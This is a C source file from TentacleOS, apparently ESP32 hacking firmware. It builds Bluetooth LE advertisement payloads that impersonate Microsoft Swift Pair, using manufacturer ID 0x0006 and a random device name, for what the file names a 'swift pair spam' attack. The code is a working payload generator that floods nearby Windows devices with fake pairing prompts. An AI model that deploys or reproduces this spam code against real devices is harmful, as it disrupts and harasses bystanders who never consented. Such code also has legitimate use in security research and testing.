// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "swift_pair_spam.h"

#include "esp_random.h"

static const char *TAG = "SWIFT_PAIR_SPAM";

#define SWIFT_PAIR_NAME_MAX_LEN 10
#define SWIFT_PAIR_CHARSET_LEN  52
#define SWIFT_PAIR_HEADER_SIZE  7

static const char SWIFT_PAIR_CHARSET[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

int generate_swift_pair_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL || max_len < SWIFT_PAIR_HEADER_SIZE)
    return 0;

  size_t name_len = (esp_random() % SWIFT_PAIR_NAME_MAX_LEN) + 1;
  size_t available = max_len - SWIFT_PAIR_HEADER_SIZE;
  if (name_len > available)
    name_len = available;

  buffer[0] = SWIFT_PAIR_HEADER_SIZE - 1 + name_len;
  buffer[1] = 0xFF;
  buffer[2] = 0x06;
  buffer[3] = 0x00;
  buffer[4] = 0x03;
  buffer[5] = 0x00;
  buffer[6] = 0x80;
  for (size_t i = 0; i < name_len; ++i)
    buffer[SWIFT_PAIR_HEADER_SIZE + i] = SWIFT_PAIR_CHARSET[esp_random() % SWIFT_PAIR_CHARSET_LEN];
  return SWIFT_PAIR_HEADER_SIZE + name_len;
}
